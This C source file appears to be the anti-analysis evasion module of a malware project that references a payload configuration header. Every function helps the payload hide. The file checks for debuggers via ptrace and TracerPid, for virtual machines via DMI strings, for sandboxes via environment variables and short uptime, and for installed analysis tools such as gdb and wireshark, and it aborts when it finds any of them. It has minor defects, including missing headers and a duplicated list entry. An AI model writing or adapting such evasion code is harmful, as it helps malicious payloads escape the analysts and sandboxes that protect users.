#include "evasion.h"
#include "payload_config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>

// Function prototypes
static int check_debuggers();
static int check_vms();
static int check_sandboxes();
static int check_time();
static int check_files();

int perform_evasion_checks() {
    printf("Performing evasion checks...\n");

    // Check for debuggers
    if (ENABLE_ANTI_DEBUG && check_debuggers() != 0) {
        printf("Debugger detected!\n");
        return -1;
    }

    // Check for virtual machines
    if (ENABLE_ANTI_VM && check_vms() != 0) {
        printf("Virtual machine detected!\n");
        return -1;
    }

    // Check for sandboxes
    if (ENABLE_ANTI_SANDBOX && check_sandboxes() != 0) {
        printf("Sandbox detected!\n");
        return -1;
    }

    // Check system time
    if (check_time() != 0) {
        printf("Abnormal system time detected!\n");
        return -1;
    }

    // Check for suspicious files
    if (check_files() != 0) {
        printf("Suspicious files detected!\n");
        return -1;
    }

    printf("Evasion checks passed.\n");
    return 0;
}

static int check_debuggers() {
    // Check for ptrace
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return -1;
    }

    // Check for /proc/self/status TracerPid
    FILE *status = fopen("/proc/self/status", "r");
    if (status) {
        char line[256];
        while (fgets(line, sizeof(line), status)) {
            if (strstr(line, "TracerPid:") && atoi(line + 10) != 0) {
                fclose(status);
                return -1;
            }
        }
        fclose(status);
    }

    return 0;
}

static int check_vms() {
    // Check for VM-specific files
    const char *vm_files[] = {
        "/proc/scsi/scsi",
        "/proc/cpuinfo",
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/board_name",
        NULL
    };

    for (int i = 0; vm_files[i]; i++) {
        FILE *file = fopen(vm_files[i], "r");
        if (file) {
            char line[256];
            while (fgets(line, sizeof(line), file)) {
                if (strstr(line, "VMware") || strstr(line, "VirtualBox") || strstr(line, "QEMU") || strstr(line, "KVM")) {
                    fclose(file);
                    return -1;
                }
            }
            fclose(file);
        }
    }

    return 0;
}

static int check_sandboxes() {
    // Check for sandbox-specific environment variables
    const char *sandbox_env[] = {
        "SANDBOX",
        "VMWARE_TOOLS",
        "VBOX_GUEST_ADDITIONS",
        NULL
    };

    for (int i = 0; sandbox_env[i]; i++) {
        if (getenv(sandbox_env[i])) {
            return -1;
        }
    }

    // Check for short uptime
    FILE *uptime = fopen("/proc/uptime", "r");
    if (uptime) {
        float uptime_seconds;
        fscanf(uptime, "%f", &uptime_seconds);
        fclose(uptime);

        if (uptime_seconds < 600) { // Less than 10 minutes
            return -1;
        }
    }

    return 0;
}

static int check_time() {
    // Check if system time is reasonable
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);

    // Check if year is between 2020 and 2030
    if (tm->tm_year + 1900 < 2020 || tm->tm_year + 1900 > 2030) {
        return -1;
    }

    return 0;
}

static int check_files() {
    // Check for suspicious analysis tools
    const char *suspicious_files[] = {
        "/usr/bin/gdb",
        "/usr/bin/strace",
        "/usr/bin/ltrace",
        "/usr/bin/ltrace",
        "/usr/bin/tcpdump",
        "/usr/bin/wireshark",
        NULL
    };

    for (int i = 0; suspicious_files[i]; i++) {
        if (access(suspicious_files[i], F_OK) == 0) {
            return -1;
        }
    }

    return 0;
}